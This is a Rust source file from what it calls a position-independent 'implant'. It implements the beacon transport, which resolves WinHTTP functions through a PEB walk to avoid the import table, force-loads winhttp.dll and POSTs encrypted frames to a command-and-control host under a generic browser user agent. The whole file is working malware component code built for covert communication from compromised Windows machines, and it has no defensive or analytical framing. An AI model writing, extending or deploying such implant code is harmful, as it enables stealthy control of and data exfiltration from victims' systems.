//! Minimal WinHTTP transport for the PIC implant.
//!
//! `no_std` can't use `ureq`/`rquest` (they're std), so beacon HTTP goes through
//! Win32 WinHTTP -- resolved via PEB walk (no IAT). Sends an encrypted frame as
//! an HTTP POST body and reads the response.
//!
//! All WinHTTP functions resolved from winhttp.dll via the PEB-walk export
//! resolver. M0: plaintext HTTP (no WINHTTP_FLAG_SECURE); TLS is a later phase.

#![cfg(target_os = "windows")]

use crate::heap::{vec, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;

/// WinHTTP function pointer table (resolved lazily, cached in statics).
struct WinhttpFns {
    open: FOpen,
    connect: FConnect,
    open_request: FOpenReq,
    send_request: FSendReq,
    receive_response: FRecvResp,
    read_data: FReadData,
    close_handle: FClose,
    query_data: FQueryData,
}

type HINTERNET = *mut c_void;
type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
type FConnect = unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
type FOpenReq = unsafe extern "system" fn(HINTERNET, *const u16, *const u16, *const u16, *const u16, *const *const u16, u32, u32) -> HINTERNET;
type FSendReq = unsafe extern "system" fn(HINTERNET, *const u8, u32, *const u8, u32, u32, usize) -> i32;
type FRecvResp = unsafe extern "system" fn(HINTERNET, *const c_void) -> i32;
type FReadData = unsafe extern "system" fn(HINTERNET, *mut u8, u32, *mut u32) -> i32;
type FClose = unsafe extern "system" fn(HINTERNET) -> i32;
type FQueryData = unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;

static mut WINHTTP: Option<WinhttpFns> = None;

/// Resolve the WinHTTP function table once (no allocation).
unsafe fn ensure_winhttp() {
    use core::sync::atomic::{AtomicBool, Ordering};
    static DONE: AtomicBool = AtomicBool::new(false);
    if DONE.load(Ordering::Acquire) {
        return;
    }
    // winhttp.dll is NOT loaded by default — resolve LoadLibraryA from
    // kernel32 and force-load it into the process first.
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
    let lla = export_addr(b"kernel32.dll", b"LoadLibraryA");
    let mut winhttp_loaded = false;
    if let Some(addr) = lla {
        let load: LoadLibraryA = core::mem::transmute(addr);
        let name = b"winhttp.dll\0";
        let h = load(name.as_ptr());
        if !h.is_null() {
            winhttp_loaded = true;
        }
    }
    if !winhttp_loaded {
        // Can't load winhttp — transport unavailable.
        DONE.store(true, Ordering::Release);
        return;
    }
    let o = export_addr(b"winhttp.dll", b"WinHttpOpen");
    let c = export_addr(b"winhttp.dll", b"WinHttpConnect");
    let r = export_addr(b"winhttp.dll", b"WinHttpOpenRequest");
    let s = export_addr(b"winhttp.dll", b"WinHttpSendRequest");
    let v = export_addr(b"winhttp.dll", b"WinHttpReceiveResponse");
    let d = export_addr(b"winhttp.dll", b"WinHttpReadData");
    let cl = export_addr(b"winhttp.dll", b"WinHttpCloseHandle");
    let q = export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable");
    if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
        (o, c, r, s, v, d, cl, q)
    {
        WINHTTP = Some(WinhttpFns {
            open: core::mem::transmute(o),
            connect: core::mem::transmute(c),
            open_request: core::mem::transmute(r),
            send_request: core::mem::transmute(s),
            receive_response: core::mem::transmute(v),
            read_data: core::mem::transmute(d),
            close_handle: core::mem::transmute(cl),
            query_data: core::mem::transmute(q),
        });
        DONE.store(true, Ordering::Release);
    }
}

/// Convert an ASCII byte string to a UTF-16 buffer (null-terminated) for WinHTTP.
fn to_utf16(s: &[u8]) -> Vec<u16> {
    let mut v = Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
    v
}

/// Send `body` as an HTTP POST to `http://host:port/path` and return the
/// response body. Returns None on any failure (the beacon loop retries).
pub unsafe fn post_frame(host: &[u8], port: u16, path: &[u8], body: &[u8]) -> Option<Vec<u8>> {
    ensure_winhttp();
    let fns = WINHTTP.as_ref()?;
    let ua = to_utf16(b"Mozilla/5.0");
    // WinHttpOpen: WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0, flags=0.
    let session = (fns.open)(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
    if session.is_null() {
        return None;
    }
    let host16 = to_utf16(host);
    let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
    if conn.is_null() {
        (fns.close_handle)(session);
        return None;
    }
    let path16 = to_utf16(path);
    let verb = to_utf16(b"POST");
    // WinHttpOpenRequest: flags=0 (plaintext; WINHTTP_FLAG_SECURE=0x00800000 for TLS).
    let req = (fns.open_request)(
        conn,
        verb.as_ptr(),
        path16.as_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        core::ptr::null(),
        0,
        0,
    );
    if req.is_null() {
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // WinHttpSendRequest: no extra headers; body in optional section.
    let ok = (fns.send_request)(
        req,
        core::ptr::null(),
        0,
        body.as_ptr(),
        body.len() as u32,
        body.len() as u32,
        0,
    );
    if ok == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // WinHttpReceiveResponse.
    if (fns.receive_response)(req, core::ptr::null()) == 0 {
        (fns.close_handle)(req);
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    // Read the response body.
    let mut out: Vec<u8> = Vec::new();
    let mut avail: u32 = 0;
    loop {
        avail = 0;
        if (fns.query_data)(req, &mut avail) == 0 || avail == 0 {
            break;
        }
        let mut chunk = vec![0u8; avail as usize];
        let mut read: u32 = 0;
        if (fns.read_data)(req, chunk.as_mut_ptr(), avail, &mut read) == 0 || read == 0 {
            break;
        }
        out.extend_from_slice(&chunk[..read as usize]);
    }
    (fns.close_handle)(req);
    (fns.close_handle)(conn);
    (fns.close_handle)(session);
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}
